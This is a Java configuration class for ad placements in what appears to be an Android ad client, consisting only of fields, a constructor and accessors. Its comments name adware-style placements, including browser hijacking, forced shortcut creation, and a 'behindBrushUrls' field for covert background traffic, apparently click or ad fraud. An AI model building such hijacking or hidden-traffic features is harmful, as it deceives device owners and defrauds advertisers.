package com.guang.client.mode;

public class GAdPositionConfig {
	private Long adPositionId;
	private int adPositionType;
	//公有属性
	private String timeSlot;//时间段 
	private Integer showNum;//每天广告展示次数
	private Float showTimeInterval;//广告时间间隔
	private String whiteList;//白名单
	
	//浏览器插屏配置
	private Float browerSpotTwoTime;//二次打开时间
	private Float browerSpotFlow;//流量
	
	//安装
	
	//卸载
	
	//banner
	private Float bannerDelyTime;//banner延迟时间
	
	//充电
	
	//应用插屏
	
	//wifi
	
	//浏览器劫持
	
	//快捷方式
	private String shortcutIconPath;//快捷方式图标路径
	private String shortcutName;//图标名称
	private String shortcutUrl;//链接
	
	//暗刷
	private String behindBrushUrls;
	
	
	
	public GAdPositionConfig(){}
	public GAdPositionConfig(Long adPositionId,int adPositionType, String timeSlot,
			Integer showNum, Float showTimeInterval, String whiteList,
			Float browerSpotTwoTime,Float browerSpotFlow, Float bannerDelyTime,
			String shortcutIconPath, String shortcutName, String shortcutUrl,
			String behindBrushUrls) {
		super();
		this.adPositionId = adPositionId;
		this.adPositionType = adPositionType;
		this.timeSlot = timeSlot;
		this.showNum = showNum;
		this.showTimeInterval = showTimeInterval;
		this.whiteList = whiteList;
		this.browerSpotTwoTime = browerSpotTwoTime;
		this.browerSpotFlow = browerSpotFlow;
		this.bannerDelyTime = bannerDelyTime;
		this.shortcutIconPath = shortcutIconPath;
		this.shortcutName = shortcutName;
		this.shortcutUrl = shortcutUrl;
		this.behindBrushUrls = behindBrushUrls;
	}

	public Long getAdPositionId() {
		return adPositionId;
	}

	public void setAdPositionId(Long adPositionId) {
		this.adPositionId = adPositionId;
	}

	public String getTimeSlot() {
		return timeSlot;
	}

	public void setTimeSlot(String timeSlot) {
		this.timeSlot = timeSlot;
	}

	public Integer getShowNum() {
		return showNum;
	}

	public void setShowNum(Integer showNum) {
		this.showNum = showNum;
	}

	public Float getShowTimeInterval() {
		return showTimeInterval;
	}

	public void setShowTimeInterval(Float showTimeInterval) {
		this.showTimeInterval = showTimeInterval;
	}

	public String getWhiteList() {
		return whiteList;
	}

	public void setWhiteList(String whiteList) {
		this.whiteList = whiteList;
	}

	public Float getBrowerSpotTwoTime() {
		return browerSpotTwoTime;
	}

	public void setBrowerSpotTwoTime(Float browerSpotTwoTime) {
		this.browerSpotTwoTime = browerSpotTwoTime;
	}

	public Float getBannerDelyTime() {
		return bannerDelyTime;
	}

	public void setBannerDelyTime(Float bannerDelyTime) {
		this.bannerDelyTime = bannerDelyTime;
	}

	public String getShortcutIconPath() {
		return shortcutIconPath;
	}

	public void setShortcutIconPath(String shortcutIconPath) {
		this.shortcutIconPath = shortcutIconPath;
	}

	public String getShortcutName() {
		return shortcutName;
	}

	public void setShortcutName(String shortcutName) {
		this.shortcutName = shortcutName;
	}

	public String getShortcutUrl() {
		return shortcutUrl;
	}

	public void setShortcutUrl(String shortcutUrl) {
		this.shortcutUrl = shortcutUrl;
	}

	public String getBehindBrushUrls() {
		return behindBrushUrls;
	}

	public void setBehindBrushUrls(String behindBrushUrls) {
		this.behindBrushUrls = behindBrushUrls;
	}
	public int getAdPositionType() {
		return adPositionType;
	}
	public void setAdPositionType(int adPositionType) {
		this.adPositionType = adPositionType;
	}
	public Float getBrowerSpotFlow() {
		return browerSpotFlow;
	}
	public void setBrowerSpotFlow(Float browerSpotFlow) {
		this.browerSpotFlow = browerSpotFlow;
	}
	
	
}
